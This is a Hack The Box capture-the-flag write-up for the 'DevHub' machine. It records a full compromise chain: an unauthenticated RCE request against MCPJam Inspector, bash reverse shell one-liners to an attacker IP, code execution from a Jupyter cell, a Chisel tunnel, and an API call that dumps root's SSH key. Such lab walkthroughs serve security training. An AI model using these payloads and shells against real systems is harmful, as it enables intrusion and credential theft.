---
title: "Hack The Box | DevHub"
description: "DevHub is a medium Linux machine exploiting CVE-2026-23744 in MCPJam Inspector v1.4.2 for unauthenticated RCE. Internal enumeration reveals a Jupyter notebook and an OPSMCP API, leading to credential dumping and root via SSH key."
pubDate: "Jun 08 2026"
heroImage: "/devhub.png"
badge: "Linux - Medium"
tags: ["CVE-2026-23744","MCPJam","Jupyter","Chisel","API","Reverse Shell","PrivEsc","Linux","HTB"]
---

- 1. Nmap TCP Open Ports:

```sh
attacker@kali:~$ sudo nmap -sS -p- --open -n -Pn --min-rate 5000 -oG allports TARGET
```

| Port | Service |
|------|---------|
| 22/tcp | SSH |
| 80/tcp | HTTP (nginx) |
| 6274/tcp | HTTP (unknown) |

- 1.2 Nmap basic scripts and service scan:

```sh
attacker@kali:~$ nmap -sCV -p22,80,6274 -oN target TARGET
```

```python
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.9p1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Redirect to devhub.htb
6274/tcp open  http     Werkzeug/3.0.1 Python/3.12.3
|_http-title: MCPJam Inspector v1.4.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Port 6274 exposes **MCPJam Inspector v1.4.2**, which is vulnerable to CVE-2026-23744 — unauthenticated RCE.

---

- 2. Exploitation — CVE-2026-23744 (MCPJam RCE):

The `/api/mcp/connect` endpoint accepts a `command` and `args` that get executed directly on the system without authentication.

- 2.2 PoC — Confirm RCE with sleep:

```http
POST /api/mcp/connect HTTP/1.1
Host: TARGET:6274
Content-Type: application/json

{
  "serverConfig": {
    "type": "stdio",
    "command": "bash",
    "args": ["-c", "sleep 5"],
    "env": {}
  },
  "serverId": "test"
}
```

Response takes ~5 seconds → **RCE confirmed**.

- 2.3 Reverse Shell:

```sh
attacker@kali:~$ nc -lvnp 4444
```

```http
POST /api/mcp/connect HTTP/1.1
Host: TARGET:6274
Content-Type: application/json

{
  "serverConfig": {
    "type": "stdio",
    "command": "bash",
    "args": ["-c", "bash -i >& /dev/tcp/10.10.14.200/4444 0>&1"],
    "env": {}
  },
  "serverId": "rev"
}
```

Shell obtained as `mcp-dev`.

![Reverse shell obtained](/devhub-1.png)

---

- 3. Internal Enumeration:

```sh
mcp-dev@devhub:~$ ss -tulnp
```

| Port | Service | Notes |
|------|---------|-------|
| 127.0.0.1:5000 | OPSMCP 2.1.0 | Internal operations API |
| 127.0.0.1:8888 | Jupyter | Notebook with token required |

- 3.2 Tunnel with Chisel:

```sh
attacker@kali:~$ chisel server -p 8000 --reverse

mcp-dev@devhub:/tmp$ ./chisel client 10.10.14.200:8000 R:5000:127.0.0.1:5000 R:8888:127.0.0.1:8888
```

![Chisel tunnel](/devhub-2.png)

---

- 4. Lateral Movement — Jupyter:

The Jupyter token is passed as a command-line argument, visible via `ps aux`:

```sh
mcp-dev@devhub:~$ ps aux | grep jupyter
# jupyter-lab --port=8888 --ip=127.0.0.1 --NotebookApp.token=<TOKEN>
```

- 4.2 Access and shell:

Open `http://localhost:8888`, paste the token, execute in a Python cell:

```python
import os
os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.200/4444 0>&1'")
```

![Jupyter shell as analyst](/devhub-3.png)

Shell obtained as `analyst`.

---

- 5. Privilege Escalation — OPSMCP API Dump:

The OPSMCP server script contains a hardcoded API key:

```sh
analyst@devhub:~$ find /opt -name "server.py" 2>/dev/null
analyst@devhub:~$ cat /opt/opsmcp/server.py | grep VALID_API_KEY
# VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
```

- 5.2 Dump credentials via hidden API tool:

```sh
analyst@devhub:~$ curl -s http://127.0.0.1:5000/tools/call \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```

Returns root's private SSH key.

![OPSMCP API dump](/devhub-4.png)

- 5.3 SSH as root:

```sh
attacker@kali:~$ chmod 600 id_rsa_root
attacker@kali:~$ ssh -i id_rsa_root root@TARGET
root@devhub:~#
```

**Root shell obtained. `user.txt` and `root.txt` captured.**

---

## Attack Chain Summary

| Phase | Technique | Tool |
|-------|-----------|------|
| Recon | Port scan + fingerprinting | nmap |
| Exploit | MCPJam RCE (CVE-2026-23744) | curl, netcat |
| Enum | Internal ports + tunnel | ss, chisel |
| Lateral | Jupyter token in `ps aux` | Jupyter Notebook |
| PrivEsc | OPSMCP API dump → root SSH key | curl, ssh |
